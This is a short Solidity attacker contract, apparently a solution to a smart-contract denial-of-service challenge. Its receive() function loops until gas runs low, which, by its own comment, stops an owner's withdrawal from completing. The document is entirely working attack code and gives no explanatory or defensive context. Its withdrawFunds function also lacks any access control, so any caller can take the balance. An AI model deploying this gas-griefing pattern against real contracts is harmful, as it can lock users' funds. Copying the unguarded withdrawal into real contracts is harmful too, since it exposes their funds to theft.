pragma solidity ^0.8.0;

contract DenialAttacker3 {
    receive() external payable {
        // Consume all available gas to prevent the owner from withdrawing
        uint x = 0;
        while (gasleft() > 100000) {
            x++;
        }
    }

    function withdrawFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}